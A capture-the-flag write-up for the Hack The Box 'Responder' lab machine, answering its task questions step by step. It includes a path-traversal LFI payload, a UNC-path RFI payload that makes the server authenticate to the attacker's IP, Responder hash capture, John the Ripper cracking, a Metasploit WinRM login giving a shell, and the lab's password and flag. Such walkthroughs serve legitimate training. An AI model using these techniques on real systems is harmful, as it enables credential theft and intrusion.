
# Starting Point / Responder

**About:** Responder is a very easy Windows machine that focuses on exploring the File Inclusion vulnerability on a web application and how this can be leveraged to collect the NetNTLMv2 challenge of the user that is running the web server. The machine showcases the Responder utility and the hash cracking tool John The Ripper to obtain a cleartext password from an NTLM hash. Finally, the Evil-WinRM tool can be used to get a terminal on the machine using the acquired credentials.


**Target:** `10.129.19.235`

----------

## Task 1 - When visiting the web service using the IP address, what is the domain that we are being redirected to?

Just visit the IP in the browser and watch where it redirects:

**Answer:** `unika.htb`

----------

## Task 2 - Which scripting language is being used on the server to generate webpages?

Since port 80 is open, run a nmap scan at port 80 with service detection/scripts:

```bash
nmap -sV -sC -p80 10.129.19.235
```
```
Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
|_http-title: Unika
```

**Answer:** `PHP`

----------

## Task 3 - What is the name of the URL parameter used to load different language versions of the webpage?

Found this one by inspecting element and noticing the two language paths:
```
http://unika.htb/index.php?page=french.html
http://unika.htb/index.php?page=german.html
```
Intended solution?

**Answer:** `page`

----------

## Task 4 - Which value for the `page` parameter would exploit a Local File Include (LFI) vulnerability?

LFI is using the server's local filesystem by path traversal. Enough `../` sequences gets us to the root, and from there we can read system files. Testing it directly in the URL:
```
http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
```

It dumps the contents of the Windows hosts file:
```bash
# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to host names. Each # entry should be kept on an individual line. The IP address should # be placed in the first column followed by the corresponding host name.
# The IP address and the host name should be separated by at least one # space.
#
# Additionally, comments (such as these) may be inserted on individual # lines or following the machine name denoted by a '#' symbol.
#
# For example:
#
# 102.54.94.97 rhino.acme.com
# source server
# 38.25.63.10 x.acme.com
# x client host
# localhost name resolution is handled within DNS itself.
# 127.0.0.1 localhost
# ::1 localhost 
```

**Answer:** `../../../../../../../../windows/system32/drivers/etc/hosts`

----------

## Task 5 - Which value for the `page` parameter would exploit a Remote File Include (RFI) vulnerability?

RFI means pointing the parameter at a remote address instead of a local path. A UNC path (`//host/share`) tells Windows to reach out to an external server:

**Answer:** `//10.10.14.6/somefile`

----------

## Task 6 - What does NTLM stand for?

https://www.lmgt.org/?q=what+does+NTLM+stand+for

**Answer:** `New Technology LAN Manager`

----------

## Task 7 - Which flag in the Responder utility specifies the network interface?

```bash
responder --help
```

```
Usage: python3 Responder.py -I eth0 -v

Required Options:
  -I eth0, --interface=eth0
      Network interface to use. Use 'ALL' for all interfaces.
```

**Answer:** `-I`

----------

## Task 8 - What is the full name of the tool commonly referred to as "john"?

Fun fact, HTB didn't like johntheripper so i was stuck on this one for lonnger than i'd like to admit

**Answer:** `John The Ripper`

----------

## Task 9 - What is the password for the administrator user?

Use the RFI vulnerability to make the server connect back to us over SMB. When it does, Responder captures the NTLM hash then we crack with John:

**Step 1:** Start Responder on the tun0 interface (our openvpn int for connecting to HTB):

```bash
responder -I tun0 -v
```

**Step 2:** Point the `page` parameter at our IP with a fake share path. The server tries to resolve the UNC path and sends us the credentials:

```
http://unika.htb/index.php?page=//10.10.14.253/helpme
```

**Step 3:** Responder catches the hash:

```
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:eee470d722fa262f:182DFDFAAD408B273772B9982392373C:010100000000000000345CD3ECEEDC0160E2F190A6066323000000000200080052004B003000460001001E00570049004E002D004E00430057004100490046004800520038004B004F0004003400570049004E002D004E00430057004100490046004800520038004B004F002E0052004B00300046002E004C004F00430041004C000300140052004B00300046002E004C004F00430041004C000500140052004B00300046002E004C004F00430041004C000700080000345CD3ECEEDC0106000400020000000800300030000000000000000100000000200000E341F2A9EED8759B9C3F8BA62369642CB9B1A13F45343DF7DDED2FE1F799C7590A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003200350033000000000000000000
```

**Step 4:** Save the hash, then use wordlist to crack it (used the default rockyou):

```bash
john -w=/usr/share/wordlists/rockyou.txt hash
```

```
badminton        (Administrator)
```

**Answer:** `badminton`

----------

## Task 10 - What port does the Windows remote access service listen on?

First guess was RDP on 3389, but that came back wrong. Running a full port scan to check what's actually open:

```bash
nmap -sVC -p- 10.129.19.235
```

```
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

Port 5985 is WinRM (Windows Remote Management)

**Answer:** `5985`

----------

## Task 11 - On which user's desktop is the flag located?

I used Metasploit and searched for `winrm`:

```bash
msf > search winrm

Matching Modules
================

   #  Name                                                 Disclosure Date  Rank    Check  Description
   -  ----                                                 ---------------  ----    -----  -----------
   0  auxiliary/gather/ldap_esc_vulnerable_cert_finder     2021-06-17       normal  No     Misconfigured Certificate Template Finder
   1    \_ AKA: Certifry                                   .                .       .      .
   2    \_ AKA: Certipy                                    .                .       .      .
   3  exploit/windows/local/bits_ntlm_token_impersonation  2019-12-06       great   Yes    SYSTEM token impersonation through NTLM bits authentication on missing WinRM Service.
   4  auxiliary/scanner/winrm/winrm_auth_methods           .                normal  No     WinRM Authentication Method Detection
   5  auxiliary/scanner/winrm/winrm_cmd                    .                normal  No     WinRM Command Runner
   6  auxiliary/scanner/winrm/winrm_login                  .                normal  No     WinRM Login Utility
   7  exploit/windows/winrm/winrm_script_exec              2012-11-01       manual  No     WinRM Script Exec Remote Code Execution
   8  auxiliary/scanner/winrm/winrm_wql                    .                normal  No     WinRM WQL Query Runner
```
Then used the `auxiliary/scanner/winrm/winrm_login` module since we had the creds to get the shell:

```bash
msf > use 6
msf auxiliary(scanner/winrm/winrm_login) > info
....
Basic options:
  Name              Current Setting  Required  Description
  ----              ---------------  --------  -----------
  ANONYMOUS_LOGIN   false            yes       Attempt to login with a blank username and password
  BLANK_PASSWORDS   false            no        Try blank passwords for all users
  BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
  CreateSession     true             no        Create a new session for every successful login
  DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
  DB_ALL_PASS       false            no        Add all passwords in the current database to the list
  DB_ALL_USERS      false            no        Add all users in the current database to the list
  DB_SKIP_EXISTING  none             no        Skip existing credentials stored in the current database (Accepted: none, user, u
                                               ser&realm)
  DOMAIN            WORKSTATION      yes       The domain to use for Windows authentication
  PASSWORD                           no        A specific password to authenticate with
  PASS_FILE                          no        File containing passwords, one per line
  Proxies                            no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies:
                                               socks5, http, socks5h, sapni, socks4
  RHOSTS                             yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/
                                               using-metasploit.html
  RPORT             5985             yes       The target port (TCP)
  SSL               false            no        Negotiate SSL/TLS for outgoing connections
  STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
  THREADS           1                yes       The number of concurrent threads (max one per host)
  URI               /wsman           yes       The URI of the WinRM service
  USERNAME                           no        A specific username to authenticate as
  USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
  USER_AS_PASS      false            no        Try the username as the password for all users
  USER_FILE                          no        File containing usernames, one per line
  VERBOSE           true             yes       Whether to print output for all attempts
  VHOST                              no        HTTP server virtual host
```

Then set the proper parameters and run:

```bash
msf auxiliary(scanner/winrm/winrm_login) > set RHOSTS 10.129.19.235
msf auxiliary(scanner/winrm/winrm_login) > set USERNAME Administrator
msf auxiliary(scanner/winrm/winrm_login) > set PASSWORD badminton
msf auxiliary(scanner/winrm/winrm_login) > run
```

```
[+] 10.129.19.235:5985 - Login Successful: WORKSTATION\Administrator:badminton
[*] Command shell session 1 opened (10.10.14.253:43237 -> 10.129.19.235:5985) at 2026-05-28 22:32:31 -0400
```

Drop into the session and look around:

```bash
msf auxiliary(scanner/winrm/winrm_login) > sessions -i 1
[*] Starting interaction with 1...
```

I dug around a little but eventually found the flag inside of Mike:

```
C:\Users> more mike\Desktop\flag.txt
ea81b7afddd03efaa0945333ed147fac
```

**Answer:** `mike`

----------

## Flag time

**Flag:** `ea81b7afddd03efaa0945333ed147fac`